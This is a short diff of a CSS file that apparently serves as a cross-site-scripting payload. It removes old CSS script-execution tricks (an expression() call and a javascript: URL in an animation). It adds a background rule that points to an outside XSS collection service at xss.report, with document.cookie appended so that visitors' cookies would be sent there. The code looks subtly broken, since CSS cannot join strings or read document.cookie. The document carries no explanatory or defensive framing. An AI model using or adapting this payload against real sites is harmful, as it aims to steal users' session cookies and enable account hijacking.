@@ -1,14 +1,4 @@
-/* Execute JavaScript in older browsers */
+/* Send data to XSS.Report */
 body {
-    color: expression(alert(1)); 
-}
-
-/* Try CSS-based execution using animations */
-@keyframes x {
-    0% { background: url("javascript:alert(1)"); }
-}
-
-/* Apply animation to force execution */
-body {
-    animation: x 1s infinite;
+    background: url("https://xss.report/c/cyphernova1337?cookie="+document.cookie);
 }
